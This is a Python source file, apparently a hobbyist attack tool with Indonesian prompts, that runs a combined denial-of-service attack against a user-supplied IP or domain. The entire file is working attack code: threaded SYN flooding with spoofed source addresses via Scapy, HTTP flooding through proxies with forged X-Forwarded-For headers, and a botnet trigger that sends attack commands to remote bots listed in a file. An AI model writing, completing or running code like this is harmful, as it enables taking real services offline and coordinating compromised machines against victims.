# attacker.py
import os
import time
import threading
import random
import requests
from scapy.all import IP, TCP, send
from colorama import Fore, init

init(autoreset=True)

def run_attack_mode():
    os.system("clear")
    print(f"""{Fore.RED}
╔═══════════════════════════════════════════════╗
║       🔥 ZENO-MB ULTIMATE ATTACK MODE 🔥      ║
║        HDN Cyber Forces | RIFQI SYSTEM       ║
╠═══════════════════════════════════════════════╣
║      L3 + L4 + L7 | Real Attack + BotNet      ║
╚═══════════════════════════════════════════════╝
""")

    target = input(Fore.YELLOW + "[?] Masukkan IP/Domain target: ")
    port = int(input(Fore.YELLOW + "[?] Masukkan port (80/443/22/8080): "))
    thread_count = int(input(Fore.YELLOW + "[?] Jumlah thread lokal: "))

    # Load bot dari file
    try:
        with open("bots.txt", "r") as f:
            bots = [line.strip().replace("http://", "").replace(":80", "") for line in f.readlines()]
        print(Fore.GREEN + f"[✓] {len(bots)} bot siap dari bots.txt")
    except:
        bots = []
        print(Fore.RED + "[X] Gagal baca bots.txt, lanjut tanpa botnet")

    # Load proxy
    try:
        with open("proxy.txt", "r") as f:
            proxies = f.read().splitlines()
    except:
        proxies = []

    user_agents = [
        "Mozilla/5.0", "curl/7.64.1", "Wget/1.20.3",
        "python-requests/2.25.1", "Go-http-client/1.1"
    ]

    # L3/L4 - SYN Flood
    def syn_flood():
        while True:
            ip_packet = IP(
                src=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                dst=target
            )
            tcp_packet = TCP(
                sport=random.randint(1024,65535),
                dport=port,
                flags="S"
            )
            send(ip_packet/tcp_packet, verbose=0)

    # L7 - HTTP Flood
    def http_flood():
        while True:
            proxy = random.choice(proxies) if proxies else None
            proxy_dict = {"http": proxy, "https": proxy} if proxy else None
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Connection": "keep-alive"
            }
            try:
                r = requests.get(f"http://{target}:{port}", headers=headers, proxies=proxy_dict, timeout=3)
                print(Fore.GREEN + f"[L7] {r.status_code} dari {proxy or 'LOCAL'}")
            except:
                print(Fore.RED + "[!] HTTP/Proxy gagal atau timeout")

    # Trigger Botnet
    def remote_trigger():
        for bot_ip in bots:
            try:
                r = requests.get(f"http://{bot_ip}/attack?target={target}&port={port}", timeout=3)
                print(Fore.YELLOW + f"[C2] Bot {bot_ip} respon: {r.status_code}")
            except:
                print(Fore.MAGENTA + f"[!] Bot {bot_ip} tidak responsif")

    # Start Threads
    for _ in range(thread_count):
        threading.Thread(target=syn_flood, daemon=True).start()
        threading.Thread(target=http_flood, daemon=True).start()

    threading.Thread(target=remote_trigger, daemon=True).start()

    print(Fore.CYAN + f"\n[✓] Serangan dimulai ke {target}:{port} "
                      f"dengan {thread_count*2} thread lokal + {len(bots)} bot remote\n")
    print(Fore.RED + "[!] Tekan CTRL+C untuk hentikan\n")

    while True:
        time.sleep(1)
